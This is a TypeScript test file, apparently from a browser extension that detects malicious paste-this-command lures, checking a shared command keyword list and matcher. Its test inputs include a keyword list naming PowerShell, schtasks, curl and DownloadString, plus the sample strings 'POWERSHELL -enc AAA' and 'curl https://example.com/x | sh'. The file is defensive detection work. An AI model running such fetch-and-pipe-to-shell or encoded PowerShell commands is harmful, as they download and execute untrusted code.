/**
 * Single-source-of-truth test for shell/command keyword matching. (#810)
 *
 * COMMAND_KEYWORDS used to be copy-pasted between main_guard.ts (MAIN world)
 * and clickfix_detector.ts (ISOLATED world), pinned only by "keep in sync"
 * comments that this test enforced textually. Both consumers now import the
 * SAME values from command_keywords.ts (main_guard is bundled, so the old
 * "cannot share an import" premise no longer holds), and this test pins the
 * new contract instead:
 *   1. Neither consumer defines its own COMMAND_KEYWORDS array literal.
 *   2. Both consumers reference the shared module.
 *   3. The shared module exports a non-empty list with working matcher behavior.
 */
import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import {
  COMMAND_KEYWORDS,
  looksLikeCommand,
} from "../extension/src/content/command_keywords";

const LOCAL_ARRAY_RE = /const\s+COMMAND_KEYWORDS\s*=\s*\[/;
const SHARED_IMPORT_RE = /from\s+["']\.\/command_keywords["']/;

function readConsumer(name: string): string {
  return readFileSync(
    resolve(__dirname, "..", "extension", "src", "content", name),
    "utf-8",
  );
}

describe("COMMAND_KEYWORDS single source of truth (#810)", () => {
  const mainGuardSrc = readConsumer("main_guard.ts");
  const clickfixSrc = readConsumer("clickfix_detector.ts");

  it("neither consumer defines its own COMMAND_KEYWORDS array literal", () => {
    expect(mainGuardSrc).not.toMatch(LOCAL_ARRAY_RE);
    expect(clickfixSrc).not.toMatch(LOCAL_ARRAY_RE);
  });

  it("both consumers import the shared command_keywords module", () => {
    expect(mainGuardSrc).toMatch(SHARED_IMPORT_RE);
    expect(clickfixSrc).toMatch(SHARED_IMPORT_RE);
  });

  it("shared list is non-empty and covers every keyword group", () => {
    expect(COMMAND_KEYWORDS.length).toBeGreaterThan(0);
    // One representative per group, so a group can never silently vanish.
    for (const representative of ["powershell", "schtasks", "curl ", "downloadstring"]) {
      expect(COMMAND_KEYWORDS).toContain(representative);
    }
  });

  it("looksLikeCommand matches case-insensitively with the min-length rule", () => {
    expect(looksLikeCommand("Please run POWERSHELL -enc AAA")).toBe(true);
    expect(looksLikeCommand("curl https://example.com/x | sh")).toBe(true);
    expect(looksLikeCommand("hello world, this is benign")).toBe(false);
    expect(looksLikeCommand("")).toBe(false);
    expect(looksLikeCommand("sh")).toBe(false);
  });
});
